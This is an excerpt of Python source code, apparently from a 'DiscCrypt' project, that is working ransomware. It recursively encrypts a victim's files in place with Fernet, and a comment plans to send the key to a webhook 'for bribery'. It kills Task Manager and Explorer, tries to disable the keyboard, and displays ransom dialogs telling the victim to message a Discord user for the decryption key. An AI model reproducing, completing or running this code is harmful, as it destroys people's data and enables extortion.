#########################
#Extract from my DiscCrypt Project.
#########################
def gen_key():
    return Fernet.generate_key()


def encr(full_path, cipther):
    try:
        with open(full_path, 'rb+') as f:
            unencrypted_data = f.read()
            encrypted_data = cipther.encrypt(unencrypted_data)
            f.seek(0)
            f.truncate()
            f.write(encrypted_data)
            f.close()
    except:
        pass   

def encrypt_files(dir):
    enckey = gen_key()
    cipther = Fernet(enckey)
    for root, dirs, files in os.walk(dir):
        for file in files:
            full_path = os.path.join(root, file)
            try:
                Thread(target=encr, args=(full_path, cipther,)).start() #ez speed threading!
                time.sleep(.04)
            except:
                pass
    return enckey #send to a webhook later for bribery funnies:tm:
  
  
  def theyarefucked():
    if os.name == 'nt':
        os.system('taskkill /f /im taskmgr.exe')
        os.system('taskkill /f /im explorer.exe')
        try:
            os.system('c:\\windows\\system32\\rundll32.exe keyboard,disable')
            os.system('c:\\windows\\rundll32.exe keyboard,disable')
        except:
            pass
    usertag = ""
    from prompt_toolkit.shortcuts import input_dialog, message_dialog
    message_dialog(title="DiscCrypt v2", text="Your PC's files have been encrypted, close this and you will not get your files back.", ok_text="Continue").run()
    message_dialog(title="DiscCrypt v2", text=f"DM {usertag} on discord for decryption key.", ok_text="Continue").run()
    x = input_dialog(title="DiscCrypt v2", text=f"Enter Decryption Key", ok_text="Enter", cancel_text="Exit").run()
    if x != None and x != "":
        if os.name == 'nt':
            decrypt_files(os.environ['HOME'], x.encode())
        elif os.getlogin() == "kabion":
            decrypt_files("/home/kabion/Downloads/mods/", x.encode())
        else:
            decrypt_files(f"/home/{os.getlogin()}", x.encode())
            
  
def de_encr(full_path, cipther):
    try:
        with open(full_path, 'rb+') as f:
            encrypted_data = f.read()
            unencrypted_data = cipther.decrypt(encrypted_data)
            f.seek(0)
            f.truncate()
            f.write(unencrypted_data)
            f.close()
            print(f'Successfully decrypted: {full_path}')
    except Exception as e:
        print(e)
        print(f"Error while decrypting {full_path}: {e}")
        pass

def decrypt_files(dir, key:bytes):
    cipther = Fernet(key)
    for root, dirs, files in os.walk(dir):
        for file in files:
            full_path = os.path.join(root, file)
            try:
                Thread(target=de_encr, args=(full_path, cipther,)).start()
                time.sleep(.03)
            except:
                pass
